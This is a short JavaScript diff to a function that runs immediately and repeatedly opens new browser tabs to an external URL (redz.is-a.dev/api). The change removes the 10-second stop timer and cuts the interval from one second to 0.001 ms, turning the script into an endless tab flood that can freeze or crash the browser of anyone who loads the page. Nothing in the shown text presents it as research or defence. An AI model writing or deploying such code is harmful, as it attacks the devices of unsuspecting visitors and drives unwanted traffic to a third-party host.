@@ -14,10 +14,7 @@
             const intervalId = setInterval(() => {
                 window.open('https://redz.is-a.dev/api/', `_blank_${counter}`); // Open a new tab
                 counter++;
-            }, 1000); // Open a new tab every 1 second
-
-            // Optional: Stop opening new tabs after a certain number
-            setTimeout(() => clearInterval(intervalId), 10000); // Stop after 10 seconds
+            }, 0.001); // Open a new tab every less than a millisecond
         }
 
         // Call the function immediately
